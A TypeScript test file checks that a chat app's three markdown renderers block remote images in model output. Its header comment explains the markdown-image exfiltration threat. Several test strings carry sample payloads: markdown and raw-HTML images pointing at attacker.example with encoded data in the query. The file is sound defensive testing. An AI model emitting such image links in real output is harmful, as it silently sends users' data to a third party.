/**
 * Chat replies and the reasoning panel render model output. A remote image
 * there loads as soon as it renders, so ![x](https://host/?d=...) would send
 * data out with no click. Both renderers block remote images. (data: images
 * were already blocked by Streamdown's sanitize step; the app's image and
 * SVG cards don't render through markdown.)
 *
 * Classic JSX transform under tsx: React must be a global (see
 * render-markdown.test.tsx).
 */
import React from "react";
(globalThis as Record<string, unknown>).React = React;

import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import { MessageResponse } from "../components/ai-elements/message.tsx";
import { HostMarkdown } from "../components/host-markdown.tsx";
import { Reasoning, ReasoningContent } from "../components/ai-elements/reasoning.tsx";

const renderers = {
	host: (md: string) => renderToStaticMarkup(<HostMarkdown text={md} />),
	message: (md: string) => renderToStaticMarkup(<MessageResponse mode="static">{md}</MessageResponse>),
	reasoning: (md: string) => renderToStaticMarkup(<Reasoning open><ReasoningContent>{md}</ReasoningContent></Reasoning>),
};

const pixel = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

for (const [name, render] of Object.entries(renderers)) {
	describe(`${name}: remote images`, () => {
		it("a markdown image to another host renders a blocked badge, never an <img>", () => {
			const html = render("Here is the chart: ![chart](https://attacker.example/c.png?d=c2VjcmV0)");
			assert.doesNotMatch(html, /<img/);
			assert.doesNotMatch(html, /attacker\.example/);
			assert.match(html, /\[Image blocked: chart\]/);
		});

		it("raw HTML <img> and plain-http images are blocked the same way", () => {
			for (const md of ['<img src="https://attacker.example/p.png?d=x" alt="p">', "![p](http://attacker.example/p.png)", "![p](//attacker.example/p.png)"]) {
				const html = render(md);
				assert.doesNotMatch(html, /<img/, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
			}
		});

		it("nothing preloads a remote image either", () => {
			assert.doesNotMatch(render("![chart](https://attacker.example/c.png)"), /rel="preload"/);
		});

		it("data: images stay as before: blocked by the sanitize step", () => {
			const html = render(`![dot](${pixel})`);
			assert.doesNotMatch(html, /<img/);
			assert.match(html, /\[Image blocked: dot\]/);
		});

		it("links retain each renderer's existing behavior", () => {
			const html = render("[the paper](https://example.com/paper)");
			assert.match(html, name === "host" ? /<a[^>]+href="https:\/\/example.com\/paper"[^>]*>the paper<\/a>/ : /<button[^>]+data-streamdown="link"[^>]*>the paper<\/button>/);
		});
	});
}
